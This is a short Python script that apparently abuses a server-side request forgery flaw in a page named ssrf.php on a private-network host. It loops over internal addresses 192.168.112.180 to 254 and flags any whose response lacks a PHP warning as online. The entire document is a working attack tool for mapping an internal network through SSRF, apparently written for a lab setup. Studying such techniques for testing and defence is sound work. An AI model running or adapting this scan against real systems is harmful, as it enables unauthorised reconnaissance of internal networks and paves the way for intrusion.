import requests

for i in range(180, 255):
    try:
        resp = requests.get(f'http://192.168.112.188/security/ssrf.php?url=http://192.168.112.{i}', timeout=2)
        if 'file_get_contents' not in resp.text and 'Warning' not in resp.text:
            print(f'192.168.112.{i} is online')
    except:
        pass